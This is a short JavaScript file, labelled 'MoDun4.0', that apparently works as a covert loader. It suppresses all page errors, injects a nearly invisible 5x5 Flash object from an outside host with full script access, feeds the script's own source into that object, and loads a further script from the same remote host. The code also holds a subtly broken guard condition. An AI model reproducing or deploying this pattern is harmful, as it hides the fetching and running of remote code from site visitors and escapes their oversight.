//
// MoDun4.0
//
(function()
{
	window.onerror = function(){};

	var fla;

    function getAddr()
	{
        var spt = document.getElementsByTagName('script');

        for(var i = 0; i < spt.length; i++)
		{
			var addr = spt[i].src.split('modund41dd41d.html?')[1];
			if (addr)
				return addr.split('?')[0];
		}
    }

	__$SWFDONE__ = function()
	{
		var p1 = hash.indexOf('{');
		var p2 = hash.lastIndexOf('}');

		try{
			fla.X(hash.substr(p1, p2 - p1 + 1));
		}catch(e){}
	}

	function init()
	{
		var arg = getAddr();
		if (!arg && (arg.length % 12))
			return;

		var box = document.createElement('div');
		box.innerHTML = '<object width=5 height=5 style="filter:alpha(opacity=10)" id=__FLA__ classid=clsid:D27CDB6E-AE6D-11cf-96B8-444553540000><param name=movie value=http://cdn.tlcs.yaowan.com/K/MdWrap.swf><param name=flashvars value=x=' + arg + '><param name=wmode value=opaque><param name=allowScriptAccess value=always></object>';

		fla = box.firstChild;
		var sty = fla.style;
		sty.position = 'absolute';
		sty.top = sty.left = '100px';
		sty.zIndex = '999';
		document.body.appendChild(fla);
		
		var spt = document.createElement('script');
		document.body.appendChild(spt);
		spt.src = 'cdn.tlcs.yaowan.com/K/1.html';
	}

	var hash = arguments.callee + "";

	attachEvent('onload', init);

})();
